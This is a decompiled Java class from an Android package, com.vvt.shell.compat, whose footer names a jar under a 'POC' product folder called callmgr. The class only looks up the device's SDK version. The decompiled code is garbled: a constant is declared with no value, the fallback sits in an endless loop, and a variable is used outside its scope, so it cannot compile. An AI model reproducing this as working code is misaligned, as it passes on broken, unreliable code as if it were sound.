package com.vvt.shell.compat;

import android.os.Build.VERSION;

public class a
{
  public static final int a = ;
  
  private static final int a()
  {
    try
    {
      i = b.a();
    }
    catch (VerifyError localVerifyError)
    {
      for (;;)
      {
        try
        {
          Object localObject = Build.VERSION.SDK;
          localObject = Integer.valueOf((String)localObject);
          i = ((Integer)localObject).intValue();
        }
        catch (NumberFormatException localNumberFormatException)
        {
          int i = 1;
        }
      }
    }
    return i;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/shell/compat/getInstance.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */